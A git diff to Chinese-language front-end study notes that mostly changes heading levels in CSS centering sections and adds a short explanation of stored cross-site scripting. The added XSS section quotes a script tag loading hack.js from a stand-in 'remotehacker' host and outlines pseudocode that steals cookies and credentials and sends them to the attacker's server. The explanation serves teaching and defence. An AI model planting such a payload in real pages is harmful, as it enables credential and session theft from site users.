@@ -512,8 +512,8 @@ sex: 0
 </html>
 ```
 ***
-## 居中
-### p标签内的文字居中
+### 居中
+#### p标签内的文字居中
 ```html
  <style>
     p{
@@ -521,7 +521,7 @@ sex: 0
     }
   </style>
 ```
-### div水平居中
+#### div水平居中
 ```html
  <style>
     div{
@@ -546,7 +546,7 @@ sex: 0
     }
   </style>
 ```
-### div水平垂直居中布局
+#### div水平垂直居中布局
 ```html
   <style>
     html{
@@ -566,7 +566,7 @@ sex: 0
     }
   </style>
 ```
-### div水平垂直居中布局
+#### div水平垂直居中布局
 ```
 fixed/absolute
 负margin
@@ -592,7 +592,7 @@ fixed/absolute
     }
   </style>
 ```
-### div水平垂直居中布局
+#### div水平垂直居中布局
 ```
 fixed/absolute
 transform
@@ -617,7 +617,7 @@ transform
     }
   </style>
 ```
-### div水平垂直居中布局
+#### div水平垂直居中布局
 ```
 fixed/absolute 
 top&bottom&left&right 0px 
@@ -688,6 +688,15 @@ div的宽度一定要固定 不然div会充满整个屏幕
 ***
 ### 跨站脚本攻击
 ```
+记住永远不要相信用户的输入！！！
+
+在表单提交的过程中，如果黑客嵌入脚本攻击代码：
+<script src="http://remotehacker/hack.js"></script>，这段代码会根据表单的字段保存在该网站的数据库中，此时代码不会执行。
+如果用户点击了修改，查看，使表单重现在页面上的操作，此时恶意代码就会执行。
+
+//hack.js伪代码
+第一步获取cookie用户名和密码
+第二步构造script标签<script src="http://remotehacker/服务端脚本"></script>实现第二次跨域，将用户名和密码带到黑客的服务器上
 ```
 ***
 ### 你的缺点
